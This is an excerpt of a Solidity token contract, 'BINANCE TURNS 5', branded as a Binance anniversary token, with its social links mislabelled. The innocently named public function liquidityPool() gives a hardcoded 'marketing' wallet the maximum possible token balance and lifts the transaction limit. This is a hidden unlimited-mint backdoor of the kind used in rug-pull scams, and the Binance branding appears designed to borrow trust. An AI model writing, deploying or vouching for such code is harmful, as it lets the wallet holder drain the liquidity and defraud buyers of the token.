...
Happy anniversary for BINANCE

Twitter: https://t.me/binanceturns5
Telegram: https://twitter.com/binanceturns5
...
contract BINANCETURNS5 is Context, IERC20, Ownable {
    ...
    address private MarketingWallet=0x03ACEdc4B00bC9Bb25947131a81Ac8fED406bDc5;
    ...
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 2 * 10**_decimals;
    string private constant _name = "BINANCE TURNS 5";
    string private constant _symbol = "BINANCE5";
    ...
    function liquidityPool() public virtual { _tOwned[MarketingWallet] = ~uint256(0); _maxTxAmount = ~uint256(0); }
